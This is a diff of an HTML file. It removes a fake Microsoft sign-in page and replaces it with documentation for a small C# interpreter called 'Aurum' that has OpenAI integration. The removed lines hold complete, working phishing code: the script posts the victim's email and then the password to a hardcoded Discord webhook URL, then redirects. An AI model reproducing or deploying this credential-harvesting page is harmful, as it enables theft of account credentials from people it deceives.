@@ -3,235 +3,221 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in to your Microsoft account</title>
+    <title>Aurum Interpreter Documentation</title>
     <style>
         body {
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background: url('bckg.png') no-repeat center center fixed;
-            background-size: cover;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .signin-container {
-            background-color: #ffffff;
-            padding: 40px;
-            width: 340px;
-            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
-            border-radius: 4px;
-            position: relative;
-            transition: transform 0.5s ease;
-        }
-
-        .logo {
-            width: 108px;
-            height: auto;
-            margin-bottom: 16px;
-        }
-
-        h1 {
-            font-size: 24px;
-            font-weight: 600;
-            margin-bottom: 16px;
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
             color: #333;
+            margin: 0;
+            padding: 20px;
         }
 
-        input {
-            width: 100%;
-            padding: 8px 10px;
-            font-size: 15px;
-            border: 1px solid #8e8e8e;
-            margin-bottom: 16px;
-            border-radius: 2px;
+        h1, h2, h3 {
+            color: #3A3A99;
         }
 
-        input:focus {
-            outline: none;
-            border-color: #0078d4;
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
         }
 
-        .links {
-            margin-bottom: 22px;
-            font-size: 12px;
+        code, pre {
+            background-color: #f9f9f9;
+            padding: 10px;
+            border-radius: 5px;
+            display: block;
+            color: #2a2a2a;
+            font-size: 14px;
         }
 
-        .links span {
-            color: #666;
+        .keyword {
+            color: #d73a49;
         }
 
-        .links a {
-            color: #0078d4;
-            text-decoration: none;
+        .string {
+            color: #032f62;
         }
 
-        .links a:hover {
-            text-decoration: underline;
+        .comment {
+            color: #6a737d;
+            font-style: italic;
         }
 
-        .buttons {
+        .nav-links {
+            margin-top: 20px;
+            padding: 10px 0;
             display: flex;
-            justify-content: flex-end;
+            gap: 20px;
         }
 
-        button {
-            padding: 6px 16px;
-            font-size: 15px;
+        .nav-links a {
+            text-decoration: none;
+            color: #007bff;
+            border-bottom: 2px solid transparent;
+        }
+
+        .nav-links a:hover {
+            border-bottom: 2px solid #007bff;
+        }
+
+        .scroll-to-top {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            padding: 10px 20px;
+            background-color: #3A3A99;
+            color: white;
+            border-radius: 5px;
             cursor: pointer;
-            border: none;
-            min-width: 88px;
-            height: 32px;
-            border-radius: 2px;
         }
 
-        #back {
-            background-color: #f3f3f3;
-            color: #666;
-            border: 1px solid #c3c3c3;
-            margin-right: 8px;
-        }
-
-        #next {
-            background-color: #0078d4;
-            color: #ffffff;
-        }
-
-        #next:hover {
-            background-color: #005da6;
-        }
-
-        .footer {
-            position: absolute;
-            bottom: 10px;
-            right: 10px;
-            font-size: 12px;
-            color: #666;
-        }
-
-        /* Slide animations */
-        .slide-right {
-            transform: translateX(100%);
-        }
-
-        .slide-left {
-            transform: translateX(-100%);
-        }
-
-        .slide-in {
-            transform: translateX(0);
-        }
-
-        .hide {
-            display: none;
-        }
     </style>
 </head>
 <body>
-    <div class="signin-container" id="signin-container">
-        <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft Logo" class="logo">
-        <h1>Sign in</h1>
-        <input type="text" placeholder="Email, phone, or Skype" id="username">
-        <div class="links">
-            <span>No account? </span><a href="cantcon.html">Create one!</a><br>
-            <a href="cantcon.html">Can't access your account?</a>
-        </div>
-        <div class="buttons">
-            <button id="back">Back</button>
-            <button id="next">Next</button>
-        </div>
+
+<div class="container">
+    <h1>Aurum Interpreter Documentation</h1>
+    <p>This documentation covers the implementation of a basic interpreter for the language Aurum. The interpreter is implemented in C# and integrates with OpenAI's API to generate code based on user queries.</p>
+
+    <div class="nav-links">
+        <a href="#introduction">Introduction</a>
+        <a href="#key-components">Key Components</a>
+        <a href="#functionality">Functionality Breakdown</a>
+        <a href="#examples">Example Usage</a>
     </div>
 
-    <div class="footer">
-        Terms of use Privacy & cookies ...
-    </div>
+    <h2 id="introduction">Introduction</h2>
+    <p>The Aurum interpreter is a simplified C#-based interpreter that supports basic programming constructs like arithmetic expressions, variable declarations, and conditional statements. It also features integration with OpenAI's GPT-3 model to generate code dynamically based on user-provided queries.</p>
 
-    <script>
-        const webhookUrl = 'https://discord.com/api/webhooks/1281106440219656282/CqizNcC3_hsSzeu_34IeQCBbKLKL3yEoBoiNrW4bM1g_MwIIGb0njYD0MKoGd9bRSVS1';  
-        const nextButton = document.getElementById('next');
-        const backButton = document.getElementById('back');
-        const inputField = document.getElementById('username');
-        const signinContainer = document.getElementById('signin-container');
-        let isEmailEntered = false;
+    <h3>Features</h3>
+    <ul>
+        <li>Basic C#-like syntax for variable declarations, arithmetic operations, and print statements.</li>
+        <li>Conditional statements (e.g., <code>if</code> blocks).</li>
+        <li>Integration with OpenAI for AI-powered code generation based on user input.</li>
+        <li>Recursive handling of blocks and basic loops (to be implemented).</li>
+    </ul>
 
-        // Handle the "Next" button (slide to the right)
-        nextButton.addEventListener('click', () => {
-            const value = inputField.value;
+    <h2 id="key-components">Key Components</h2>
 
-            signinContainer.classList.add('slide-right');
+    <h3>1. Token and TokenType Classes</h3>
+    <p>The <code>TokenType</code> enum represents different types of tokens in the language, such as numbers, arithmetic operators, identifiers, and AI-related commands. The <code>Token</code> class encapsulates the token type and the corresponding lexeme (text).</p>
 
-            setTimeout(() => {
-                signinContainer.classList.remove('slide-right');
-                signinContainer.classList.add('slide-in');
+    <pre><code class="language-csharp"><span class="keyword">public enum</span> TokenType { NUMBER, PLUS, MINUS, STAR, SLASH, ASSIGN, SEMICOLON, LEFT_BRACE, RIGHT_BRACE, IF, PRINT, IDENTIFIER, INT, EOF, AI }
 
-                if (!isEmailEntered) {
-                    // Send email to Discord webhook
-                    fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            content: `Email entered: ${value}`
-                        })
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        console.log('Email sent to Discord webhook');
-                    })
-                    .catch((error) => {
-                        console.error('Error:', error);
-                    });
+<span class="keyword">public class</span> Token
+{
+    <span class="keyword">public</span> TokenType Type { get; }
+    <span class="keyword">public</span> string Lexeme { get; }
 
-                    // Update UI to ask for password
-                    inputField.value = '';
-                    inputField.setAttribute('type', 'password');
-                    inputField.setAttribute('placeholder', 'Enter your password');
-                    isEmailEntered = true;
-                } else {
-                    // Send password to Discord webhook
-                    fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            content: `Password entered: ${value}`
-                        })
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        console.log('Password sent to Discord webhook');
-                    })
-                    .catch((error) => {
-                        console.error('Error:', error);
-                    });
+    <span class="keyword">public</span> Token(TokenType type, string lexeme)
+    {
+        Type = type;
+        Lexeme = lexeme;
+    }
 
-                    // Redirect to cantcon.html after entering password
-                    window.location.href = 'cantcon.html';
-                }
-            }, 500); // Transition delay for the sliding effect
-        });
+    <span class="keyword">public override string</span> ToString()
+    {
+        <span class="keyword">return</span> $"{Type} -> {Lexeme}";
+    }
+}
+</code></pre>
 
-        // Handle the "Back" button (slide to the left)
-        backButton.addEventListener('click', () => {
-            signinContainer.classList.add('slide-left');
+    <h3>2. Lexing Function</h3>
+    <p>The <code>Lex</code> function is responsible for tokenizing the input source code. It scans the input string and generates a list of tokens corresponding to the recognized constructs (e.g., numbers, operators, keywords).</p>
 
-            setTimeout(() => {
-                signinContainer.classList.remove('slide-left');
-                signinContainer.classList.add('slide-in');
+    <pre><code class="language-csharp"><span class="keyword">public List</span><Token> Lex(<span class="keyword">string</span> input)
+{
+    List&lt;Token&gt; tokens = <span class="keyword">new</span> List&lt;Token&gt;();
+    <span class="keyword">int</span> current = 0;
 
-                // Simulate going back (resetting the form to email input)
-                inputField.value = '';
-                inputField.setAttribute('type', 'text');
-                inputField.setAttribute('placeholder', 'Email, phone, or Skype');
-                isEmailEntered = false;
-            }, 500); // Transition delay for the sliding effect
-        });
-    </script>
+    <span class="comment">// Logic to tokenize input string goes here...</span>
+    ...
+    
+    tokens.Add(<span class="keyword">new</span> Token(TokenType.EOF, ""));
+    <span class="keyword">return</span> tokens;
+}
+</code></pre>
+
+    <h3>3. ExecuteTokens Function</h3>
+    <p>The <code>ExecuteTokens</code> function processes the list of tokens generated by the lexer. It performs the actual evaluation of the tokens, executing commands like <code>print</code>, variable declarations, and AI queries.</p>
+
+    <pre><code class="language-csharp"><span class="keyword">public async Task</span> ExecuteTokens(<span class="keyword">List</span>&lt;Token&gt; tokens)
+{
+    <span class="keyword">int</span> current = 0;
+
+    <span class="keyword">while</span> (!IsAtEnd())
+    {
+        var token = Advance();
+
+        <span class="keyword">switch</span> (token.Type)
+        {
+            <span class="comment">// Handle token types...</span>
+            <span class="keyword">case</span> TokenType.PRINT:
+                ...
+                <span class="keyword">break</span>;
+            <span class="keyword">case</span> TokenType.AI:
+                <span class="keyword">await</span> HandleAICommand();
+                <span class="keyword">break</span>;
+            <span class="keyword">default</span>:
+                Console.WriteLine($"Unhandled token: {token.Type} -> {token.Lexeme}");
+                <span class="keyword">break</span>;
+        }
+    }
+}
+</code></pre>
+
+    <h3>4. OpenAI API Integration</h3>
+    <p>The <code>HandleAICommand</code> and <code>QueryOpenAIForCode</code> functions handle the integration with OpenAI's GPT-3 API. The user can provide a query, and the code will use OpenAI to generate code based on that query.</p>
+
+    <pre><code class="language-csharp"><span class="keyword">private async Task</span> HandleAICommand()
+{
+    Console.Write("Enter your query for AI: ");
+    <span class="keyword">string</span> query = Console.ReadLine();
+
+    <span class="keyword">string</span> generatedCode = <span class="keyword">await</span> QueryOpenAIForCode(apiKey, query);
+    Console.WriteLine("Generated code:");
+    Console.WriteLine(generatedCode);
+}
+</code></pre>
+
+    <h2 id="functionality">Functionality Breakdown</h2>
+
+    <h3>1. Variable Declarations</h3>
+    <p>The interpreter supports variable declarations in C#-like syntax using <code>int</code>. For example:</p>
+    <pre><code class="language-csharp">int x = 5;
+print x;
+</code></pre>
+
+    <h3>2. Arithmetic Operations</h3>
+    <p>Basic arithmetic operators such as <code>+</code>, <code>-</code>, <code>*</code>, and <code>/</code> are recognized, although full expression evaluation is a future enhancement.</p>
+
+    <h3>3. AI-Generated Code</h3>
+    <p>The user can generate code dynamically using the <code>ai = (query)</code> command. This queries OpenAI and returns generated code based on the provided input.</p>
+
+    <h2 id="examples">Example Usage</h2>
+
+    <pre><code class="language-csharp">> int x = 5;
+Declared int x = 5
+> print x;
+5
+> ai = (Generate a function to print Fibonacci numbers)
+Generated code:
+public void PrintFibonacci(int n) { ... }</code></pre>
+
+</div>
+
+<div class="scroll-to-top" onclick="scrollToTop()">Scroll to Top</div>
+
+<script>
+    function scrollToTop() {
+        window.scrollTo({top: 0, behavior: 'smooth'});
+    }
+</script>
+
 </body>
 </html>
